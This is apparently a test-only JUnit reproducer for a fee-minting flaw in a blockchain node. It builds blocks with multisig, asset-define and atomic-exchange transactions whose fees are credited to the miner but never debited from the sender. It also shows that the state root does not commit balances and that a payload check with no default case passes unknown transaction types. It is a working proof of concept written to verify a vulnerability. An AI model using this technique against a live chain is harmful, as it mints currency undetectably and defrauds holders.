/*
 * TEST-ONLY reproducer. No production code is modified by this file.
 *
 * Question under test: can a block carrying a transaction of type 0x04..0x08
 * (TRANSFER_MULTISIG_MULTISIG / TRANSFER_MULTISIG_NORMAL / TRANSFER_NORMAL_MULTISIG /
 *  ASSET_DEFINE / ATOMIC_EXCHANGE) pass the full block rule chain while the fee
 * it declares in its gasPrice is credited to coinbase but never debited from the
 * sender, i.e. unbounded minting?
 */
package org.nexus.core.validate;

import org.apache.commons.codec.binary.Hex;
import org.junit.jupiter.api.Test;
import org.nexus.command.Configuration;
import org.nexus.command.IncubatorAddress;
import org.nexus.command.TransactionCheck;
import org.nexus.consensus.pow.EconomicModel;
import org.nexus.consensus.pow.PackageMiner;
import org.nexus.consensus.pow.Proposer;
import org.nexus.consensus.pow.ProposersFactory;
import org.nexus.consensus.pow.TargetState;
import org.nexus.core.Block;
import org.nexus.core.WhitelistTransaction;
import org.nexus.core.account.Account;
import org.nexus.core.account.AccountDB;
import org.nexus.core.account.Transaction;
import org.nexus.crypto.ed25519.Ed25519;
import org.nexus.crypto.ed25519.Ed25519KeyPair;
import org.nexus.crypto.ed25519.Ed25519PrivateKey;
import org.nexus.db.AccountState;
import org.nexus.db.StateDB;
import org.nexus.db.TargetStateFactory;
import org.nexus.encoding.BigEndian;
import org.nexus.keystore.crypto.RipemdUtility;
import org.nexus.keystore.crypto.SHA3Utility;
import org.nexus.pool.PeningTransPool;
import org.springframework.test.util.ReflectionTestUtils;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyLong;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

public class MultiSigAssetAtomicMintReproducerTest {

    /** Block reward used by the mocked economic model (20 NEX in smallest units). */
    private static final long REWARD = EconomicModel.INITIAL_SUPPLY;
    /** gasPrice of the probe transaction; fee = gasPrice * GAS_TABLE[type]. */
    private static final long GAS_PRICE = 1000L;

    private static final BigInteger MAX_TARGET = BigInteger.ONE.shiftLeft(256).subtract(BigInteger.ONE);

    // ---------------------------------------------------------------- 0x04..0x08

    @Test
    void type0x04_multisigMultisig_mintsFee() {
        assertTypeMintsFeeWithoutDebit(4);
    }

    @Test
    void type0x05_multisigNormal_mintsFee() {
        assertTypeMintsFeeWithoutDebit(5);
    }

    @Test
    void type0x06_normalMultisig_mintsFee() {
        assertTypeMintsFeeWithoutDebit(6);
    }

    @Test
    void type0x07_assetDefine_mintsFee() {
        assertTypeMintsFeeWithoutDebit(7);
    }

    @Test
    void type0x08_atomicExchange_mintsFee() {
        assertTypeMintsFeeWithoutDebit(8);
    }

    /**
     * Builds one block [coinbase(reward+fee), tx(type, gasPrice=X)] and runs the
     * production rule chain plus the state-root rule. Fails loudly with the
     * blocking rule and its message if any gate stops it.
     */
    private void assertTypeMintsFeeWithoutDebit(int type) {
        long gasPerTx = Transaction.GAS_TABLE[type];
        assertEquals(50000L, gasPerTx, "premise: GAS_TABLE[" + type + "] must be 50000");
        long fee = GAS_PRICE * gasPerTx;
        String label = "type 0x0" + type;

        // --- keys / accounts -------------------------------------------------
        Ed25519KeyPair senderKp = Ed25519.generateKeyPair();
        Ed25519KeyPair minerKp = Ed25519.generateKeyPair();
        byte[] senderPub = senderKp.getPublicKey().getEncoded();
        byte[] senderPriv = senderKp.getPrivateKey().getEncoded();
        byte[] minerPub = minerKp.getPublicKey().getEncoded();

        byte[] senderHash = RipemdUtility.ripemd160(SHA3Utility.keccak256(senderPub));
        byte[] minerHash = RipemdUtility.ripemd160(SHA3Utility.keccak256(minerPub));

        long senderBalanceBefore = 1000L * EconomicModel.NEX;
        long senderNonceBefore = 7L;
        long minerBalanceBefore = 0L;

        Account senderAccount = new Account(0, senderHash, senderNonceBefore, senderBalanceBefore, 0, 0, 0);
        Account minerAccount = new Account(0, minerHash, 0, minerBalanceBefore, 0, 0, 0);
        Account totalAccount = new Account(0, IncubatorAddress.resultpubhash(), 0, 0, 0, 0, 0);

        // --- transactions ----------------------------------------------------
        Transaction tx = new Transaction(
                1, type, senderNonceBefore + 1, senderPub,
                GAS_PRICE, 0L,
                "probe".getBytes(StandardCharsets.UTF_8),
                minerHash, new byte[Transaction.SIGNATURE_SIZE]);
        byte[] signature = new Ed25519PrivateKey(senderPriv).sign(tx.getRawForSign());
        ReflectionTestUtils.setField(tx, "signature", signature);

        Transaction coinbase = new Transaction(
                1, Transaction.Type.COINBASE.ordinal(), 1L,
                new byte[Transaction.PUBLIC_KEY_SIZE], 0L,
                REWARD + fee, new byte[0], minerHash, new byte[Transaction.SIGNATURE_SIZE]);

        List<Transaction> body = new ArrayList<>();
        body.add(coinbase);
        body.add(tx);

        // --- block -----------------------------------------------------------
        Block block = blockWith(body, 1L);
        // Declared post-state root is computed from the *expected* post state.
        // The id of an account is pubkeyHash + height, so this is exactly what a
        // miner would publish.
        block.hashMerkleState = Block.calculateMerkleState(
                List.of(new Account(1L, minerHash, 0, REWARD + fee, 0, 0, 0)));
        block.hashMerkleRoot = Block.calculateMerkleRoot(body);

        // --- mocked chain state ---------------------------------------------
        StateDB stateDB = mock(StateDB.class);
        Block bestBlock = emptyBlock(0L);
        when(stateDB.getBestBlock()).thenReturn(bestBlock);
        Block parent = emptyBlock(0L);
        when(stateDB.getBlock(any(byte[].class))).thenReturn(parent);

        TargetStateFactory targetStateFactory = mock(TargetStateFactory.class);
        TargetState targetState = mock(TargetState.class);
        when(targetState.getTarget()).thenReturn(MAX_TARGET);
        when(targetStateFactory.getInstance(any(Block.class))).thenReturn(targetState);
        when(stateDB.getTargetStateFactory()).thenReturn(targetStateFactory);

        ProposersFactory proposersFactory = mock(ProposersFactory.class);
        when(proposersFactory.getProposer(any(Block.class), anyLong()))
                .thenReturn(Optional.of(new Proposer(Hex.encodeHexString(minerHash), 0L, Long.MAX_VALUE)));
        when(stateDB.getProposersFactory()).thenReturn(proposersFactory);

        Map<String, AccountState> accounts = new HashMap<>();
        accounts.put(Hex.encodeHexString(senderHash), new AccountState(senderAccount, new HashMap<>(), new HashMap<>()));
        accounts.put(Hex.encodeHexString(minerHash), new AccountState(minerAccount, new HashMap<>(), new HashMap<>()));
        when(stateDB.getAccounts(any(byte[].class), any(List.class))).thenReturn(accounts);

        // --- production rule chain ------------------------------------------
        CompositeBlockRule composite = compositeBlockRule(stateDB);

        Result compositeResult = composite.validateBlock(block);
        assertTrue(compositeResult.isSuccess(),
                label + ": BLOCKED by composite rule chain -> " + compositeResult.getMessage());

        // --- assertion 2: sender untouched ----------------------------------
        assertEquals(senderBalanceBefore, senderAccount.getBalance(),
                label + ": sender balance must be unchanged");
        assertEquals(senderNonceBefore, senderAccount.getNonce(),
                label + ": sender nonce must be unchanged");

        // --- assertion 3: coinbase credited with the fee ---------------------
        long minerBefore = minerAccount.getBalance();
        MerkleRule merkleRule = merkleRule(totalAccount, senderAccount, minerAccount);
        Result merkleResult = merkleRule.validateBlock(block);
        assertTrue(merkleResult.isSuccess(),
                label + ": BLOCKED by MerkleRule -> " + merkleResult.getMessage());

        long minerDelta = minerAccount.getBalance() - minerBefore;
        assertEquals(REWARD + fee, minerDelta,
                label + ": miner must be credited reward + fee");
        assertEquals(fee, tx.getFee(), label + ": fee must be gasPrice*GAS_TABLE[type]");
        assertEquals(0L, senderBalanceBefore - senderAccount.getBalance(),
                label + ": no debit was taken from the sender for the fee");

        // --- "undetectable": same id-root at different balances --------------
        String rootWithoutBalance = Hex.encodeHexString(
                Block.calculateMerkleState(List.of(new Account(1L, minerHash, 0, 0, 0, 0, 0))));
        String rootWithBalance = Hex.encodeHexString(
                Block.calculateMerkleState(List.of(new Account(1L, minerHash, 0, REWARD + fee, 0, 0, 0))));
        assertEquals(rootWithoutBalance, rootWithBalance,
                label + ": state root must not commit balances");

        System.out.println("[REPRODUCED] " + label + " fee=" + fee
                + " senderBalance=" + senderAccount.getBalance()
                + " senderNonce=" + senderAccount.getNonce()
                + " minerBalance=" + minerAccount.getBalance());
    }

    // ---------------------------------------------------------------- uncertainty (a)

    /**
     * TransactionCheck.PayloadCheck has a switch without `default`. For 0x04..0x08
     * it falls through to `new APIResult()`. ResultSupport.Code is an int with no
     * initializer, i.e. 0, while AccountRule treats only code 5000 as failure.
     */
    @Test
    void unknownTypePayloadCheckReturnsNonFailureCode() {
        Ed25519KeyPair senderKp = Ed25519.generateKeyPair();
        byte[] senderPub = senderKp.getPublicKey().getEncoded();
        byte[] senderPriv = senderKp.getPrivateKey().getEncoded();
        byte[] toHash = RipemdUtility.ripemd160(SHA3Utility.keccak256(senderPub));

        Transaction tx = new Transaction(1, 4, 1L, senderPub, 1L, 0L,
                "p".getBytes(StandardCharsets.UTF_8), toHash, new byte[Transaction.SIGNATURE_SIZE]);
        ReflectionTestUtils.setField(tx, "signature", new Ed25519PrivateKey(senderPriv).sign(tx.getRawForSign()));

        TransactionCheck transactionCheck = new TransactionCheck();
        Configuration configuration = mock(Configuration.class);
        when(configuration.getMin_procedurefee()).thenReturn(1L);
        ReflectionTestUtils.setField(transactionCheck, "configuration", configuration);

        Account account = new Account(0, RipemdUtility.ripemd160(SHA3Utility.keccak256(senderPub)), 0L, 1000L, 0, 0, 0);
        org.nexus.ApiResult.APIResult result = transactionCheck.TransactionVerify(tx, account, null);

        System.out.println("[UNCERTAINTY-A] TransactionVerify(0x04).code=" + result.getCode()
                + " message=" + result.getMessage());
        assertEquals(0, result.getCode(),
                "PayloadCheck without default must fall through to APIResult default code 0");
        assertTrue(result.getCode() != 5000,
                "AccountRule:177 only treats 5000 as failure -> this passes");
    }

    // ---------------------------------------------------------------- helpers

    private static CompositeBlockRule compositeBlockRule(StateDB stateDB) {
        Block genesis = emptyBlock(0L);
        genesis.nVersion = 1L;

        BasicRule basicRule = new BasicRule(genesis, "test");
        ReflectionTestUtils.setField(basicRule, "stateDB", stateDB);
        ReflectionTestUtils.setField(basicRule, "orphanHeightsRange", 100);
        ReflectionTestUtils.setField(basicRule, "blockInterval", 60);
        ReflectionTestUtils.setField(basicRule, "consensusMode", "dpos");

        EconomicModel economicModel = mock(EconomicModel.class);
        when(economicModel.getConsensusRewardAtHeight(1L)).thenReturn(REWARD);
        CoinbaseRule coinbaseRule = new CoinbaseRule();
        ReflectionTestUtils.setField(coinbaseRule, "stateDB", stateDB);
        ReflectionTestUtils.setField(coinbaseRule, "economicModel", economicModel);

        ConsensusRule consensusRule = new ConsensusRule(stateDB);

        AccountRule accountRule = new AccountRule("test");
        TransactionCheck transactionCheck = new TransactionCheck();
        Configuration configuration = mock(Configuration.class);
        when(configuration.getMin_procedurefee()).thenReturn(1L);
        ReflectionTestUtils.setField(transactionCheck, "configuration", configuration);
        WhitelistTransaction whitelist = mock(WhitelistTransaction.class);
        when(whitelist.IsUnchecked(anyString())).thenReturn(false);
        PeningTransPool pool = mock(PeningTransPool.class);
        ReflectionTestUtils.setField(accountRule, "stateDB", stateDB);
        ReflectionTestUtils.setField(accountRule, "transactionCheck", transactionCheck);
        ReflectionTestUtils.setField(accountRule, "whitelistTransaction", whitelist);
        ReflectionTestUtils.setField(accountRule, "peningTransPool", pool);
        ReflectionTestUtils.setField(accountRule, "packageMiner", new PackageMiner());

        CompositeBlockRule composite = new CompositeBlockRule();
        composite.addRule(basicRule);
        composite.addRule(new AddressRule());
        composite.addRule(coinbaseRule);
        composite.addRule(consensusRule);
        composite.addRule(new SignatureRule());
        composite.addRule(accountRule);
        // Same transaction-rule set as the Spring-wired composite (payment extension).
        composite.addTransactionRule(new PaymentChannelRule());
        composite.addTransactionRule(new BatchTransferRule());
        composite.addTransactionRule(new StableCoinRule());
        composite.addTransactionRule(new BridgeRule());
        return composite;
    }

    private static MerkleRule merkleRule(Account totalAccount, Account senderAccount, Account minerAccount) {
        AccountDB accountDB = mock(AccountDB.class);
        when(accountDB.selectaccount(any(byte[].class))).thenAnswer(invocation -> {
            byte[] hash = invocation.getArgument(0);
            if (Arrays.equals(hash, IncubatorAddress.resultpubhash())) {
                return totalAccount;
            }
            if (Arrays.equals(hash, senderAccount.getPubkeyHash())) {
                return senderAccount;
            }
            if (Arrays.equals(hash, minerAccount.getPubkeyHash())) {
                return minerAccount;
            }
            return null;
        });
        MerkleRule merkleRule = new MerkleRule("exchange");
        ReflectionTestUtils.setField(merkleRule, "accountDB", accountDB);
        return merkleRule;
    }

    private static Block blockWith(List<Transaction> body, long height) {
        Block block = emptyBlock(height);
        block.nVersion = 1L;
        block.nTime = System.currentTimeMillis() / 1000L;
        block.nBits = BigEndian.encodeUint256(MAX_TARGET);
        block.body = new ArrayList<>(body);
        return block;
    }

    private static Block emptyBlock(long height) {
        Block block = new Block();
        block.nVersion = 1L;
        block.nHeight = height;
        block.nTime = System.currentTimeMillis() / 1000L;
        block.hashPrevBlock = new byte[Block.HASH_SIZE];
        block.hashMerkleRoot = new byte[Block.HASH_SIZE];
        block.hashMerkleState = new byte[Block.HASH_SIZE];
        block.hashMerkleIncubate = new byte[Block.HASH_SIZE];
        block.nBits = BigEndian.encodeUint256(MAX_TARGET);
        block.nNonce = new byte[Block.HASH_SIZE];
        block.body = new ArrayList<>();
        return block;
    }
}
